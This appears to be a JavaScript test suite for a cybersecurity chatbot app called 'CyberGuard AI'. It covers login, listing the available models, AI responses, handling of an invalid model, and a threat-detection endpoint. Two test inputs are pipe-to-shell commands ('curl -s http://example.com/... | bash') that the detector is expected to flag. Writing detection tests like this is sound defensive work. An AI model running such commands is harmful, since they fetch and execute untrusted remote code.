/**
 * CyberGuard AI - AI Response Generation Tests
 * 
 * Tests AI functionality including:
 * - OpenRouter API connectivity
 * - Response generation
 * - Model switching
 * - Error handling
 */

const axios = require('axios');

// Test configuration
const config = {
  baseUrl: 'http://localhost:8001',
  testUser: {
    email: 'test@cyberguard.ai',
    fullname: 'Test User',
    password: 'TestPassword123!'
  },
  testPrompts: [
    'What are the biggest cybersecurity threats in 2025?',
    'Explain how to protect against phishing attacks',
    'Analyze the security implications of this command: curl -s http://example.com/script.sh | bash'
  ]
};

// Store data between tests
const testData = {
  token: null,
  models: [],
  defaultModel: null
};

const runTests = async ({ success, failure, skipped }) => {
  try {
    // Authenticate first to get a token
    await authenticate(success, failure, skipped);
    
    // Test retrieving available models
    await testGetModels(success, failure, skipped);
    
    // Test AI response generation
    await testAiResponses(success, failure, skipped);
    
    // Test error handling with invalid model
    await testInvalidModel(success, failure, skipped);
    
    // Test security analysis functionality
    await testSecurityAnalysis(success, failure, skipped);
  } catch (error) {
    failure('AI test suite failed', error);
  }
};

// Authenticate to get a token
const authenticate = async (success, failure, skipped) => {
  try {
    // Try to log in with test user
    try {
      const loginRes = await axios.post(`${config.baseUrl}/api/auth/login`, {
        email: config.testUser.email,
        password: config.testUser.password
      });
      
      if (loginRes.data && loginRes.data.token) {
        testData.token = loginRes.data.token;
        success('AI authentication - Login successful');
        return;
      }
    } catch (e) {
      // User doesn't exist, create a new one
      try {
        const signupRes = await axios.post(`${config.baseUrl}/api/auth/signup`, config.testUser);
        
        if (signupRes.data && signupRes.data.token) {
          testData.token = signupRes.data.token;
          success('AI authentication - Created test user');
          return;
        }
      } catch (signupError) {
        failure('AI authentication - Failed to create test user', signupError);
        return;
      }
    }
    
    failure('AI authentication - Failed to get authentication token');
  } catch (error) {
    failure('AI authentication failed', error);
  }
};

// Test retrieving available models
const testGetModels = async (success, failure, skipped) => {
  if (!testData.token) {
    skipped('Get models - No authentication token available');
    return;
  }
  
  try {
    const modelsRes = await axios.get(
      `${config.baseUrl}/api/admin/models`,
      { headers: { Authorization: `Bearer ${testData.token}` } }
    );
    
    if (modelsRes.data && Array.isArray(modelsRes.data.models)) {
      testData.models = modelsRes.data.models;
      
      if (testData.models.length > 0) {
        success(`Get models - Successfully retrieved ${testData.models.length} models`);
        
        // Get the configured default model
        const configRes = await axios.get(
          `${config.baseUrl}/api/admin/config`,
          { headers: { Authorization: `Bearer ${testData.token}` } }
        );
        
        if (configRes.data && configRes.data.defaultModel) {
          testData.defaultModel = configRes.data.defaultModel;
          success(`Get models - Default model: ${testData.defaultModel}`);
        } else {
          failure('Get models - Failed to retrieve default model configuration');
        }
      } else {
        failure('Get models - No models available in the response');
      }
    } else {
      failure('Get models - Invalid response format');
    }
  } catch (error) {
    failure('Get models failed', error);
  }
};

// Test AI response generation
const testAiResponses = async (success, failure, skipped) => {
  if (!testData.token) {
    skipped('AI responses - No authentication token available');
    return;
  }
  
  if (testData.models.length === 0) {
    skipped('AI responses - No models available for testing');
    return;
  }
  
  try {
    // Use the test-ai endpoint for direct testing
    const prompt = config.testPrompts[0];
    const testRes = await axios.post(
      `${config.baseUrl}/api/admin/test-ai`,
      { prompt },
      { headers: { Authorization: `Bearer ${testData.token}` } }
    );
    
    if (testRes.data && testRes.data.response) {
      const responseText = testRes.data.response;
      const model = testRes.data.model;
      
      success(`AI responses - Successfully generated response using model: ${model}`);
      
      // Log a sample of the response
      console.log('\nSample AI response:');
      console.log('-'.repeat(80));
      console.log(responseText.substring(0, 300) + (responseText.length > 300 ? '...' : ''));
      console.log('-'.repeat(80));
      
      // Validate response quality
      if (responseText.length > 100) {
        success('AI responses - Response has sufficient length');
      } else {
        failure('AI responses - Response is too short, possible API issue');
      }
      
      // Check if the model used matches what we expect
      if (model) {
        success(`AI responses - Model identifier received: ${model}`);
      } else {
        failure('AI responses - No model identifier in response');
      }
    } else {
      failure('AI responses - Invalid response format or empty response');
    }
  } catch (error) {
    failure('AI responses failed', error);
  }
};

// Test error handling with invalid model
const testInvalidModel = async (success, failure, skipped) => {
  if (!testData.token) {
    skipped('Invalid model - No authentication token available');
    return;
  }
  
  try {
    // Use an invalid model ID
    const invalidModel = 'invalid-model-id-123';
    const prompt = config.testPrompts[0];
    
    try {
      await axios.post(
        `${config.baseUrl}/api/admin/test-ai`,
        { prompt, model: invalidModel },
        { headers: { Authorization: `Bearer ${testData.token}` } }
      );
      
      failure('Invalid model - Request succeeded with invalid model ID');
    } catch (error) {
      if (error.response && error.response.status >= 400) {
        success('Invalid model - Correctly returned error for invalid model ID');
      } else {
        failure('Invalid model - Unexpected error', error);
      }
    }
  } catch (error) {
    failure('Invalid model test failed', error);
  }
};

// Test security analysis functionality
const testSecurityAnalysis = async (success, failure, skipped) => {
  if (!testData.token) {
    skipped('Security analysis - No authentication token available');
    return;
  }
  
  try {
    // Test with a potentially dangerous command
    const text = 'curl -s http://example.com/suspicious.sh | bash';
    const analysisRes = await axios.post(
      `${config.baseUrl}/api/admin/test-security`,
      { text },
      { headers: { Authorization: `Bearer ${testData.token}` } }
    );
    
    if (analysisRes.data && analysisRes.data.threatLevel && analysisRes.data.analysis) {
      const threatLevel = analysisRes.data.threatLevel;
      
      success(`Security analysis - Successfully analyzed text (Threat level: ${threatLevel})`);
      
      // A suspicious command should be detected as medium or high threat
      if (threatLevel === 'HIGH' || threatLevel === 'MEDIUM') {
        success('Security analysis - Correctly identified suspicious command');
      } else {
        failure(`Security analysis - Failed to detect suspicious command (level: ${threatLevel})`);
      }
      
      // Log a sample of the analysis
      console.log('\nSecurity analysis:');
      console.log('-'.repeat(80));
      console.log(analysisRes.data.analysis.substring(0, 300) + 
                  (analysisRes.data.analysis.length > 300 ? '...' : ''));
      console.log('-'.repeat(80));
    } else {
      failure('Security analysis - Invalid response format');
    }
    
    // Test with safe text
    const safeText = 'How to update my operating system?';
    const safeAnalysisRes = await axios.post(
      `${config.baseUrl}/api/admin/test-security`,
      { text: safeText },
      { headers: { Authorization: `Bearer ${testData.token}` } }
    );
    
    if (safeAnalysisRes.data && safeAnalysisRes.data.threatLevel) {
      const threatLevel = safeAnalysisRes.data.threatLevel;
      
      success(`Security analysis - Successfully analyzed safe text (Threat level: ${threatLevel})`);
      
      // Safe text should be detected as low threat
      if (threatLevel === 'LOW') {
        success('Security analysis - Correctly identified safe text');
      } else {
        failure(`Security analysis - Incorrectly flagged safe text (level: ${threatLevel})`);
      }
    } else {
      failure('Security analysis - Invalid response format for safe text');
    }
  } catch (error) {
    failure('Security analysis failed', error);
  }
};

module.exports = { runTests };
